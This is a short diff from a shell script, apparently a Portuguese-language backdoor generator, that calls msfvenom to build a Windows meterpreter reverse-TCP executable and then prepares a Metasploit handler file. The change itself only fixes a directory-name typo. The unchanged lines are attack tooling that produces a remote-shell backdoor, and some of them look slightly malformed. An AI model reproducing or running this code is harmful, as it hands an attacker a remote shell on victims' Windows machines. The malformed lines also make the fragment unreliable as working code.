@@ -337,7 +337,7 @@ then
 					$msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port 6 x > $caminho/$nome.exe
 					msfconsole=$HOME/metasploit-framework/msfcosole
 					echo "$ye Backdoor $nome gerado em $caminho/$nome.exe"
-					mkdir -p ~/Backdoor-apk/.WimB
+					mkdir -p ~/Backdoor-apk/.WinB
 					cd $HOME/Backdoor-apk/.WinB
 
 					cat > WinB-tcp.rb <<- EOF
